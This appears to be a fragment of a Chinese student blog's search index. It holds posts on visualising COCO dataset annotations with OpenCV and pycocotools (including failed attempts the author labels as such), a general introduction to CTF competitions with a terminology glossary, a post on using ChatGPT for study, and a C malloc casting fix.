2)\n\n完整代码示例：\nimport cv2# Load the imageimg = cv2.imread(&#x27;image.jpg&#x27;)# Convert to grayscalegray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)# Apply Canny edge detectionedges = cv2.Canny(gray, 100, 200)# Find contourscontours, hierarchy = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)# Draw contours on the original imagecv2.drawContours(img, contours, -1, (0, 255, 0), 2)# Display the resultcv2.imshow(&#x27;Contours&#x27;, img)cv2.waitKey(0)cv2.destroyAllWindows()\n\n这段代码将在窗口中显示带有轮廓的原始图像。\n##cv2:\npip install opencv-python\n\n初次尝试未成功的代码：\nimport cv2from PIL import Image# Load the imageimg = cv2.imread(&#x27;000000000885.jpg&#x27;)# Convert to grayscalegray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)# Apply Canny edge detectionedges = cv2.Canny(gray, 100, 200)# Find contourscontours, hierarchy = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)# Draw contours on the original imagecv2.drawContours(img, contours, -1, (0, 255, 0), 2)# Get bounding boxes of contoursbboxes = []for contour in contours:    x, y, w, h = cv2.boundingRect(contour)    right = x + w    lower = y + h    left = x    upper = y    bboxes.append([left, upper, right, lower])# Open the image for further processingimage = Image.open(&quot;000000000885.jpg&quot;)# Define the target box coordinates as a tuplebox_coords = (100, 100, 300, 300)# Extract the target box as a new imagetarget_image = image.crop(box_coords)# Assume you have obtained the target class, bounding box, and segmentation label information and stored them in respective variables# Create an empty list to store the entry for each objectannotations_list = []# For each object, create a dictionary entry and add it to the listnum_objects = 3image_id = 885category_ids = [&quot;human&quot;, &quot;dog&quot;, &quot;cat&quot;]  # use list instead of stringsegmentations = [&quot;person&quot;, &quot;dog&quot;, &quot;cat&quot;]  # use list instead of stringfor i in range(num_objects):    annotation_dict = &#123;        &#x27;image_id&#x27;: image_id,        &#x27;category_id&#x27;: category_ids[i],        &#x27;bbox&#x27;: bboxes[i],        &#x27;segmentation&#x27;: segmentations[i]    &#125;    annotations_list.append(annotation_dict)# Create the final dictionary containing keys such as &#x27;image_ids&#x27;, &#x27;category_ids&#x27;, &#x27;bboxes&#x27;, and &#x27;segmentations&#x27;, and store it as a listannotations_dict = &#123;    &#x27;image_ids&#x27;: [image_id],    &#x27;category_ids&#x27;: [ann[&#x27;category_id&#x27;] for ann in annotations_list],    &#x27;bboxes&#x27;: [ann[&#x27;bbox&#x27;] for ann in annotations_list],    &#x27;segmentations&#x27;: [ann[&#x27;segmentation&#x27;] for ann in annotations_list]&#125;# Open the file for writingwith open(&quot;annotations.txt&quot;, &quot;w&quot;) as f:    # Write the dictionary to the file    f.write(str(annotations_dict))# Close the filef.close()######################################### Define functions to get image and category informationdef get_image_info(&#x27;image_id&#x27;):    # Implementation of getting image info    passdef get_categories():    # Implementation of getting categories    pass# Load the image using PILimage_path = &#x27;000000000885.jpg&#x27;image = Image.open(image_path)# Get the image id, bounding boxes, and segmentation masksimage_id = 885image_info = get_image_info(image_id)categories = get_categories()import matplotlib.pyplot as pltfrom matplotlib.patches import Rectangle# Create a plot with the image and bounding boxesfig, ax = plt.subplots()ax.imshow(image)for i in range(len(image_info[&#x27;bboxes&#x27;])):    bbox = image_info[&#x27;bboxes&#x27;][i]    category_id = image_info[&#x27;category_ids&#x27;][i]    category_name = categories[category_id][&#x27;name&#x27;]    seg_mask = image_info[&#x27;segmentations&#x27;][i]    # Add a rectangle for the bounding box    rect = Rectangle((bbox[0], bbox[1]), bbox[2] - bbox[0], bbox[3] - bbox[1], linewidth=1, edgecolor=&#x27;r&#x27;,                     facecolor=&#x27;none&#x27;)    ax.add_patch(rect)    # Add the category name as text next to the bounding box    ax.text(bbox[0], bbox[1], category_name, fontsize=8, color=&#x27;r&#x27;)plt.show()\n\n第二次尝试：\nimport jsonimport urllib.requestfrom PIL import Image, ImageDraw# 读取标签数据with open(&#x27;TestData_coco.json&#x27;, &#x27;r&#x27;) as f:    data = json.load(f)# 下载图像并以图像ID命名for img in data[&#x27;images&#x27;]:    url = img[&#x27;coco_url&#x27;]    img_id = str(img[&#x27;id&#x27;]).zfill(12)    filename = img_id + &#x27;.jpg&#x27;    urllib.request.urlretrieve(url, filename)# 建立字典存储数据img_dict = &#123;&#125;for img in data[&#x27;images&#x27;]:    img_id = img[&#x27;id&#x27;]    img_dict[img_id] = &#123;&#x27;image_ids&#x27;: [], &#x27;category_ids&#x27;: [], &#x27;bboxes&#x27;: [], &#x27;segmentations&#x27;: []&#125;for ann in data[&#x27;annotations&#x27;]:    img_id = ann[&#x27;image_id&#x27;]    img_dict[img_id][&#x27;image_ids&#x27;].append(img_id)    img_dict[img_id][&#x27;category_ids&#x27;].append(ann[&#x27;category_id&#x27;])    img_dict[img_id][&#x27;bboxes&#x27;].append(ann[&#x27;bbox&#x27;])    img_dict[img_id][&#x27;segmentations&#x27;].append(ann[&#x27;segmentation&#x27;])# 可视化图像ID为1000的图像及标签img_path = &#x27;000000001000.jpg&#x27;img = Image.open(img_path)draw = ImageDraw.Draw(img)for ann in data[&#x27;annotations&#x27;]:    if ann[&#x27;image_id&#x27;] == 1000:        bbox = ann[&#x27;bbox&#x27;]        draw.rectangle([(bbox[0], bbox[1]), (bbox[0]+bbox[2], bbox[1]+bbox[3])], outline=&#x27;red&#x27;)        cat_id = ann[&#x27;category_id&#x27;]        cat_name = data[&#x27;categories&#x27;][cat_id][&#x27;name&#x27;]        draw.text((bbox[0], bbox[1]-15), cat_name, fill=&#x27;red&#x27;)img.show()# 抽取部分数据保存成新的json文件new_data = &#123;&#x27;licenses&#x27;: data[&#x27;licenses&#x27;], &#x27;info&#x27;: data[&#x27;info&#x27;], &#x27;categories&#x27;: data[&#x27;categories&#x27;], &#x27;images&#x27;: [], &#x27;annotations&#x27;: []&#125;for img_id in [139, 724, 785, 885, 1000]:    new_data[&#x27;images&#x27;].append(data[&#x27;images&#x27;][id])    anns = [ann for ann in data[&#x27;annotations&#x27;] if ann[&#x27;image_id&#x27;] == id]    new_data[&#x27;annotations&#x27;].extend(anns)with open(&#x27;NewTestData_coco.json&#x27;, &#x27;w&#x27;) as f:    json.dump(new_data, f)\n\n最后一部分存在问题，且该程序虽然能够实现框出物体，但是错误的把人标识成了自行车（T_T）\n看了别人的，用到了pycocotools这个库，于是查了一下他是干什么的：pycocotools 是一个 Python 库，用于处理 COCO 数据集（Common Objects in Context）。COCO 数据集是一个非常受欢迎的计算机视觉数据集，其中包含了各种常见物体的图像，如人、动物、车辆等，并且为每个对象提供了遮挡、不同角度和光照条件下的多个标注框。该数据集旨在支持目标检测、分割、姿态估计等多个任务。\npycocotools 提供了一系列工具函数，用于解析 COCO 数据集中的注释信息、评估模型预测结果和可视化注释等，使得使用 COCO 数据集进行目标检测与分割相关研究的开发者能够更加方便地进行实验和评估。\n一个可行的程序：\nimport osimport requestsfrom PIL import Imageimport numpy as npimport matplotlib.pyplot as pltfrom matplotlib.patches import Rectanglefrom pycocotools.coco import COCO# 任务1: 加载COCO数据集的标签文件def load_coco_data(json_path):    coco = COCO(json_path)    return coco# 任务2: 下载图像并以其ID命名保存到指定目录中def download_images(coco, output_dir):    if not os.path.exists(output_dir):        os.makedirs(output_dir)    for img_id in coco.imgs:        img_info = coco.loadImgs(ids=img_id)[0]        url = img_info[&#x27;coco_url&#x27;]        response = requests.get(url)        if response.status_code == 200:            with open(os.path.join(output_dir, f&#x27;&#123;img_id&#125;.jpg&#x27;), &#x27;wb&#x27;) as f:                f.write(response.content)# 任务3: 转换数据格式def transform_data(coco):    transformed_data = &#123;&#125;    for img_id in coco.imgs:        ann_ids = coco.getAnnIds(imgIds=img_id)        annotations = coco.loadAnns(ids=ann_ids)        transformed_data[img_id] = &#123;&#x27;image_ids&#x27;: [img_id],                                    &#x27;category_ids&#x27;: [ann[&#x27;category_id&#x27;] for ann in annotations],                                    &#x27;bboxes&#x27;: [ann[&#x27;bbox&#x27;] for ann in annotations],                                    &#x27;segmentations&#x27;: [ann[&#x27;segmentation&#x27;] for ann in annotations]&#125;    return transformed_data# 任务4: 可视化图像ID为1000的图像及其标签def visualize_image(image_id, data, image_dir, coco):    img_info = coco.loadImgs(ids=image_id)[0]    image = Image.open(os.path.join(image_dir, f&quot;&#123;image_id&#125;.jpg&quot;))    plt.figure()    plt.imshow(image)    ax = plt.gca()    # 定义一个颜色列表，用于给不同的标签分配不同的颜色    colors = [&#x27;r&#x27;, &#x27;g&#x27;, &#x27;b&#x27;, &#x27;y&#x27;, &#x27;c&#x27;, &#x27;m&#x27;]    for i, (category_id, bbox) in enumerate(zip(data[image_id][&#x27;category_ids&#x27;], data[image_id][&#x27;bboxes&#x27;])):        category_name = coco.loadCats(ids=category_id)[0][&#x27;name&#x27;]        x, y, width, height = bbox        rect = Rectangle((x, y), width, height, linewidth=2, edgecolor=colors[i % len(colors)], facecolor=&#x27;none&#x27;)        ax.add_patch(rect)        # 设置字体大小为8，颜色为黑色，透明度为0.35        plt.text(x, y, category_name, color=&#x27;k&#x27;, fontsize=8, backgroundcolor=colors[i % len(colors)], alpha=0.35)    plt.show()# 主程序if __name__ == &#x27;__main__&#x27;:    json_path = &#x27;TestData_coco.json&#x27;    image_dir = &#x27;images&#x27;    image_id_to_visualize = 1000    # 加载COCO JSON文件    coco_data = load_coco_data(json_path)    # 下载图像    download_images(coco_data, image_dir)    # 转换数据格式    transformed_data = transform_data(coco_data)    # 可视化图像ID为1000的图像及其标签    visualize_image(image_id_to_visualize, transformed_data, image_dir, coco_data)\n\n可行程序2：\nimport jsonimport osimport requestsfrom pycocotools.coco import COCOimport numpy as npimport cv2# 读取标签数据dataDir = &#x27;.&#x27;dataType = &#x27;val2017&#x27;annFile = &#x27;&#123;&#125;/TestData_coco.json&#x27;.format(dataDir)coco = COCO(annFile)# 下载图像数据save_dir = &#x27;./images&#x27;if not os.path.exists(save_dir):    os.makedirs(save_dir)for img_id in coco.getImgIds():    img_info = coco.loadImgs(img_id)[0]    img_url = img_info[&#x27;coco_url&#x27;]    img_name = &#x27;&#123;:012d&#125;.jpg&#x27;.format(img_id)    img_path = os.path.join(save_dir, img_name)    if not os.path.exists(img_path):        response = requests.get(img_url)        with open(img_path, &#x27;wb&#x27;) as f:            f.write(response.content)# 存储格式变换data = &#123;&#125;for img_id in coco.getImgIds():    img_info = coco.loadImgs(img_id)[0]    ann_ids = coco.getAnnIds(imgIds=img_id)    anns = coco.loadAnns(ann_ids)    categories = []    bboxes = []    segmentations = []    for ann in anns:        categories.append(ann[&#x27;category_id&#x27;])        bboxes.append(ann[&#x27;bbox&#x27;])        segmentations.append(ann[&#x27;segmentation&#x27;])    data[img_id] = &#123;&#x27;image_ids&#x27;: [img_id], &#x27;category_ids&#x27;: categories, &#x27;bboxes&#x27;: bboxes, &#x27;segmentations&#x27;: segmentations&#125;# 可视化图像ID为1000的图像及标签img_id = 1000img_info = coco.loadImgs(img_id)[0]img_path = os.path.join(save_dir, img_info[&#x27;file_name&#x27;])img = cv2.imread(img_path)ann_ids = coco.getAnnIds(imgIds=img_id)anns = coco.loadAnns(ann_ids)for ann in anns:    bbox = ann[&#x27;bbox&#x27;]    segmentation = ann[&#x27;segmentation&#x27;]    category_id = ann[&#x27;category_id&#x27;]    category_info = coco.loadCats(category_id)[0]    category_name = category_info[&#x27;name&#x27;]    color = tuple(np.random.randint(0, 256, 3).tolist())    cv2.rectangle(img, (int(bbox[0]), int(bbox[1])), (int(bbox[0] + bbox[2]), int(bbox[1] + bbox[3])), color, 2)    cv2.putText(img, category_name, (int(bbox[0]), int(bbox[1]) - 5), cv2.FONT_HERSHEY_SIMPLEX, 0.5, color, 2)    mask = coco.annToMask(ann)    contour, _ = cv2.findContours(mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)    cv2.drawContours(img, contour, -1, color, 2)cv2.imshow(&#x27;image&#x27;, img)cv2.waitKey(0)cv2.destroyAllWindows()\n\n"},{"title":"git安装 for 菜鸟","url":"/2023/05/22/git%E5%AE%89%E8%A3%85%20for%20%E8%8F%9C%E9%B8%9F/","content":"作为一个接触IT领域的人，git是必须要用到的\n","categories":["入坑指南"]},{"title":"CTF简介","url":"/2023/03/04/CTF%E7%AE%80%E4%BB%8B/","content":"你知道什么是CTF比赛吗？CTF本来是西方的一种传统运动。在比赛上两军会互相争夺旗帜，当有一方的旗帜已被敌军夺取，就代表了那一方的战败。我所说的CTF比赛即为黑客大赛，显而易见，此处所说的CTF是信息安全领域。\n本人就是一个菜鸟CTFer   (QAQ)\n\nCTF比赛的必要条件就是有一台电脑\nCTF比赛有哪些比赛模式？解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。\n攻防模式（Attack-Defense）​\t\t攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。\n混合模式（Mix）​\t\t结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。\n比赛类型：Web - 网络攻防Reverse Engineering - 逆向工程Crypto - 密码攻击Mobile - 移动安全Misc - 安全杂项\n具体内容网上的其他人比我写的详细，由于本文主要是让大家对CTF有个大概的了解，故不再阐述详细内容\nCTF练习平台推荐1,BUUCTF \n2,攻防世界\n3,bugku\n4,NSSCTF \n个人建议如果你想体验当黑客的感觉，参加CTF比赛可以满足你的需求；\n如果你是信息工程专业相关的学生，CTF可以帮助你学到很多专业知识，让你更上一层楼；\n如果你觉得自己毅力或者耐心不足，不建议入门CTF；\nCTF上手可能比较困难，建议先自己到我上面推荐的练习平台先练一下，感受一下，再去网上找相关答案及解题步骤，照着答案做，然后尝试解类似题目，找到感觉后再解题进步就会非常快。\n如果你有任何问题，可以在我的邮箱（&#49;&#x32;&#48;&#54;&#x36;&#x36;&#x31;&#52;&#51;&#x34;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;）评论留言，我这个菜鸟可以在自己能力范围之内为你提供帮助。\nCTF俚语语言学家通常将非正式语言称为“俚语”，并为各种职业的技术词汇保留术语“行话”。然而，这个集合的祖先被称为“行话文件”，CTF俚语即为CTF界的“行话”。\n\nFlag：指比赛中需要寻找的答案或密码。\n\nPwn：指攻破或控制系统，常用于指攻击某个漏洞或服务，如pwn the server。\n\nShellcode：指在漏洞利用中需要注入的代码，用于获取系统权限。\n\nExploit：指利用系统漏洞的代码或技术。\n\nPayload：指在攻击或利用漏洞时需要发送到目标系统的恶意代码或数据。\n\nReversing：指反汇编或逆向分析二进制程序。\n\nBrute force：指暴力破解密码或密钥，常用于密码学挑战。\n\nSteganography：指隐藏信息的技术，如在图片或音频文件中隐藏文本信息。\n\nCryptography：指加密和解密技术，常用于密码学挑战。\n\nCryptoanalysis：指破解加密算法或密文的技术，常用于密码学挑战。\n\nBinary exploitation：指利用二进制程序中的漏洞攻击系统。\n\nWeb exploitation：指利用Web应用程序中的漏洞攻击系统。\n\nForensics：指数字取证技术，用于分析和恢复已删除的数据或系统日志。\n\nOSINT：指开放源情报，指通过公开的信息源获取信息的技术。\n\nRoot：指获取系统管理员权限。\n\nwp：指”Write-up”，意为“赛题分析和解答”。\n\nForensics：数字取证，是指在计算机系统和数字设备中收集、保护、分析和呈现与计算机相关的证据的科学。\n\nBrute force：暴力破解，是指通过穷举法尝试所有可能的密码组合来破解密码。\n\nSocial engineering：社会工程学，是指利用心理学、人际关系和欺骗等手段来获取机密信息的技术。\n\n靶场：“靶场”通常是指CTF练习平台，也被称为“训练营”，“实验室”等。\n\n\n这些俚语在CTF界非常常见，熟悉这些术语对于参加CTF比赛或进行网络安全工作都是非常重要的。\n\n","tags":["CTF","黑客","大致了解"]},{"title":"chatGPT——学习利器","url":"/2023/03/10/chatGPT%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E5%88%A9%E5%99%A8/","content":"人尽皆知，chatgpt是openAI研发的一款语言模型，很多人只是拿chatgpt来玩玩或者问它一些刁钻问题来难为它，但是你有没有想过将其变成你的学习利器呢，它不只是能帮你写写文章，写写代码这么简单，当我问它一些数学甚至物理学上的问题时，它也能从容面对，并且给出相对准确的答复，我在遇到某些问题时时常在搜索引擎上搜索答案或解决方法，虽然大多数问题都可以得到答案，但是当你遇到的问题你不知道其涉及的标准名称或专业名词时，你在搜索引擎上输入模糊抽象的问题时，往往无法得到你想要的答案，这时候你就可以将遇到的问题以提问方式输入chatGPT，它会给你解释你遇到的问题，这样你再去查找相关内容时就有了明确的方向，这对我的帮助实在是太大了，比如说，我现在想知道有没有一个函数可以实现某种操作A，如果我去搜索引擎搜：“可以实现操作A的函数”，它出来的结果是没有你想知道的内容的，它出来的是“函数”、“操作A”等词条的结果，在没有chatGPT的前几年，我这个时候就只有两种选择：1，搜索所有关于”操作A”的内容，再结合满足你的限制条件，慢慢找到合适的函数；2，问你觉得会这个问题的人。而你提问chatGPT时，他就会直接告诉你，这样是不是节省了非常多的时间，大大提高了学习效率。\n\n而且chatGPT可以联系上下文对你的问题进行解析，如果答案不符合你的想法，你可以在下文对其做出限制或补充，这真的是太棒了\n","tags":["chatgpt","AI"]},{"title":"linux 换源 for 菜鸟","url":"/2023/05/22/linux%E6%8D%A2%E6%BA%90%20for%20%E8%8F%9C%E9%B8%9F/","content":"","categories":["入坑指南"]},{"title":"编程问题汇总","url":"/2023/05/22/%E7%BC%96%E7%A8%8B%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","content":"1int* dist = malloc(sizeof(int) * graph-&gt;V);int* prev = malloc(sizeof(int) * graph-&gt;V);\n\n报错从”void”到指向非”void”的指针的转换要求显式类型转换错误\n因为malloc函数返回的是void类型指针，需要显式转换为int类型指针。可以将代码改为：\n改为\nint* dist = (int*) malloc(sizeof(int) * graph-&gt;V);int* prev = (int*) malloc(sizeof(int) * graph-&gt;V);\n\n","tags":["编程"]}]